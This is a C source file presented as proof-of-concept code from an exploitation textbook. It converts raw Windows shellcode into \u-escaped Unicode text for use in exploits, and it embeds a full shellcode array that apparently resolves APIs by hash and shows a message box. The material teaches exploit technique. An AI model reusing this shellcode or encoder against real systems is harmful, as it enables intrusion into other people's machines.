/*****************************************************************************
      To be the apostrophe which changed "Impossible" into "I'm possible"!
		
POC code of chapter 27 in book "Vulnerability Exploit and Analysis Technique"
 
file name	: A2U_converter.c
author		: failwest  
date		: 2007.10.22
description	: used to change shellcode from ASCII mode to Unicode mode
Noticed		:
version		: 1.0
E-mail		: failwest@gmail.com
		
	Only for educational purposes    enjoy the fun from exploiting :)
******************************************************************************/
#include <stdio.h>
FILE * fp=NULL;
void A2U(unsigned char * ascii, int size)
{
	int i=0;
	unsigned int unicode = 0;
	
	for(i=0; i<size; i+=2)//read a unicode
	{
		unicode = (ascii[i+1] << 8) + ascii[i];
		//printf("\\u%0.4x", unicode);
		fprintf(fp, "\\u%0.4x", unicode);
	}
}
void main(int argc, char **argv)
{
	char popup_general[]=
		"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
		"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
		"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
		"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
		"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
		"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
		"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
		"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
		"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
		"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
		"\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
    if((fp=fopen("unicode_shellcode.txt","w"))==NULL)
		exit(0);
	A2U(popup_general, strlen(popup_general));
	fclose(fp);
}
